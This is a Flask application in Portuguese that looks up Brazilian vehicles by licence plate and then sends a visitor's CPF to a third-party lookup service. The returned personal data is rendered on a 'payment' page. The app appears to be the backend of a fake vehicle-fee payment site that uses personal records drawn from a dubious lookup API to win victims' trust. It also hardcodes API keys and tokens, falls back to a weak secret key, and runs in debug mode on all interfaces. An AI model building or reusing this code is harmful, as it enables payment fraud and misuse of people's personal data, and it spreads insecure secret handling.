from flask import Flask, render_template, url_for, request, redirect, flash, session
import os
import requests
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "a secret key")
app.static_folder = 'static'

API_KEY = os.environ.get("VEHICLE_API_KEY", "6b68366ccc3b47c77ceb9d3d0f2b3799")
API_URL = "https://wdapi2.com.br/consulta/{placa}/" + API_KEY
CPF_API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/consultar', methods=['POST'])
def consultar():
    placa = request.form.get('placa', '').strip().upper()
    exercicio = request.form.get('exercicio')

    if not placa:
        flash('Por favor, informe a placa do veículo.')
        return redirect(url_for('index'))

    if not placa.isalnum() or len(placa) != 7:
        flash('Formato de placa inválido. Use o formato AAANNNN ou AAAAANN.')
        return redirect(url_for('index'))

    try:
        response = requests.get(API_URL.format(placa=placa), timeout=10)
        response.raise_for_status()

        veiculo_data = response.json()
        if veiculo_data.get('codigoRetorno') == '0':
            # Store vehicle data in session
            session['veiculo_data'] = veiculo_data
            return render_template('veiculo.html', veiculo=veiculo_data)
        else:
            flash('Não foi possível encontrar informações para esta placa.')
            return redirect(url_for('index'))

    except requests.RequestException as e:
        print(f"Erro ao consultar API: {e}")
        flash('Ocorreu um erro ao consultar os dados do veículo. Tente novamente.')
        return redirect(url_for('index'))

@app.route('/pagamento', methods=['GET'])
def pagamento():
    return render_template('pagamento.html')

@app.route('/validar_cpf', methods=['POST'])
def validar_cpf():
    cpf = request.form.get('cpf', '').strip()
    cpf_numerico = ''.join(filter(str.isdigit, cpf))

    if not cpf_numerico or len(cpf_numerico) != 11:
        flash('CPF inválido. Por favor, digite um CPF válido.')
        return redirect(url_for('pagamento'))

    try:
        # Create a new requests session for HTTP requests
        http_session = requests.Session()
        response = http_session.get(
            CPF_API_URL.format(cpf=cpf_numerico),
            timeout=15,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        )
        response.raise_for_status()

        try:
            dados = response.json()
            if dados.get('DADOS'):
                # Get vehicle data from Flask session
                veiculo_data = session.get('veiculo_data')
                if not veiculo_data:
                    flash('Dados do veículo não encontrados. Por favor, faça a consulta novamente.')
                    return redirect(url_for('index'))

                return render_template('dados_usuario.html', 
                                    dados=dados.get('DADOS'),
                                    now=datetime.now,
                                    timedelta=timedelta,
                                    veiculo=veiculo_data)
            else:
                flash('CPF não encontrado ou inválido.')
                return redirect(url_for('pagamento'))

        except ValueError as e:
            print(f"Erro ao processar resposta da API: {e}")
            print(f"Resposta da API: {response.text}")
            flash('Erro ao processar os dados do CPF. Tente novamente.')
            return redirect(url_for('pagamento'))

    except requests.RequestException as e:
        print(f"Erro ao consultar API de CPF: {e}")
        print(f"URL chamada: {CPF_API_URL.format(cpf=cpf_numerico)}")
        flash('Ocorreu um erro ao validar o CPF. Tente novamente.')
        return redirect(url_for('pagamento'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)